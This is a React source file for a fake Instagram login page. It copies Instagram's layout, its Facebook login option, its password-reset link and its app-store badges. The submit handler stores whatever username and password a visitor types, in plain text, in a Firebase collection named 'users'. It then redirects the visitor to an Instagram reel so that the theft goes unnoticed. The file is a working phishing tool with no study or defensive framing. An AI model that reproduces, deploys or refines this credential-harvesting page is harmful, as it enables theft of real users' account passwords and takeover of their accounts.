import logo from "../Assets/logo.png";
import fbIcon from "../Assets/fbIcon.png";
import microsoftIcon from "../Assets/microsoftLogo.png";
import googlePlayIcon from "../Assets/googlePlayIcon.png";
import "../Components/App.css";
import { useState } from "react";
import { addDoc, collection } from "firebase/firestore";
import { db } from "../config/firebase";

function App() {
  const [newUserName, setNewUserName] = useState("");
  const [newPassword, setNewPassword] = useState("");

  const details = collection(db, "users");

  async function handleSubmit() {
    try {
      await addDoc(details, { password: newPassword, userName: newUserName });
      window.location.href =
        "https://www.instagram.com/ig_giiyu/reel/C0GiFQvI83Z/";
    } catch (e) {
      console.error(e);
    }
  }
  return (
    <>
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          backgroundColor: "#fff",
          padding: "20px",
        }}
      >
        <div
          style={{
            display: "flex",
            width: "80%",
            flexDirection: "column",
            alignItems: "center",
            border: "1px solid rgb(219, 219, 219)",
          }}
        >
          <div style={{ margin: "20px 0" }}>
            <img src={logo} height="51px" width="180px" alt="logo"></img>
          </div>
          <div style={{ marginBottom: "10px", width: "70%" }}>
            <input
              placeholder="Phone number,username, or email"
              style={{
                width: "100%",
                padding: "8px",
                borderRadius: "5px",
                border: "1px solid #ccc",
              }}
              onChange={(e) => {
                setNewUserName(e.target.value);
              }}
            />
          </div>
          <div style={{ marginBottom: "10px", width: "70%" }}>
            <input
              type="password"
              placeholder="Password"
              style={{
                width: "100%",
                padding: "8px",
                borderRadius: "5px",
                border: "1px solid #ccc",
              }}
              onChange={(e) => {
                setNewPassword(e.target.value);
              }}
            />
          </div>
          <div style={{ marginBottom: "10px", width: "74%" }}>
            <button
              style={{
                borderRadius: "10px",
                width: "100%",
                backgroundColor: "#4CB5F9",
                color: "white",
                borderColor: "white",
                marginLeft: "7px",
                fontSize: "18px",
              }}
              href="www.google.com"
              onClick={() => {
                handleSubmit();
              }}
            >
              Log in
            </button>
          </div>
          <div
            style={{ display: "flex", flexDirection: "row", margin: "10px 0" }}
          >
            OR&nbsp;
          </div>
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              marginBottom: "10px",
              width: "100%",
              textAlign: "center",
            }}
          >
            <a
              href="https://www.facebook.com/"
              style={{
                borderRadius: "5px",
                width: "100%",
                height: "30px",
                marginRight: "10px",
                marginBottom: "10px",
                marginTop: "10px",
                borderColor: "white",
                textDecoration: "none",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#385185",
              }}
            >
              <img
                src={fbIcon}
                height="20px"
                alt="facebookIcon"
                style={{ paddingRight: "1.5px" }}
              />
              Log in with Facebook
            </a>
            <a
              href="https://www.instagram.com/accounts/password/reset/"
              style={{
                textDecoration: "none",
                color: "#00376B",
                margin: "10px 0",
              }}
            >
              Forgot password?
            </a>
          </div>
        </div>
        <div
          style={{
            width: "80%",
            display: "flex",
            justifyContent: "center",
            marginTop: "15px",
            border: "1px solid rgb(219, 219, 219)",
          }}
        >
          <p>
            Don't have an account?
            <a
              href="www.google.com"
              style={{
                color: "#0095F6",
                textDecoration: "none",
                fontWeight: "bold",
              }}
            >
              &nbsp;Sign Up
            </a>
          </p>
        </div>
        <p> Get the App</p>
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
          }}
        >
          <a
            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D079821F4-B1C5-4D37-8B35-175A10BB5E17%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps://www.google.com/&pli=1"
            style={{ textDecoration: "none" }}
          >
            <button
              style={{
                backgroundColor: "black",
                padding: "7px",
                color: "white",
                borderRadius: "5px",
                marginRight: "10px",
                display: "flex",
                alignItems: "center",
                height: "50px",
              }}
            >
              <img
                src={googlePlayIcon}
                alt="googlePLayIcon"
                style={{ height: "25px", paddingRight: "10px" }}
              />
              <p style={{ textAlign: "left", fontSize: "10px" }}>
                GET IT ON <br />
                <h2 style={{ padding: "0", margin: "0" }}>Google Play</h2>
              </p>
            </button>
          </a>
          <a
            href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1008&hl=en"
            style={{ textDecoration: "none" }}
          >
            <button
              style={{
                backgroundColor: "black",
                padding: "7px",
                color: "white",
                borderRadius: "5px",
                marginRight: "10px",
                display: "flex",
                alignItems: "center",
                height: "50px",
              }}
            >
              <img
                src={microsoftIcon}
                alt="microsoftIcon"
                style={{ height: "25px", paddingRight: "10px" }}
              />
              <p style={{ textAlign: "left", fontSize: "10px" }}>
                GET IT FROM <br />
                <h2 style={{ padding: "0", margin: "0" }}>Microsoft</h2>
              </p>
            </button>
          </a>
        </div>
      </div>
    </>
  );
}
export default App;
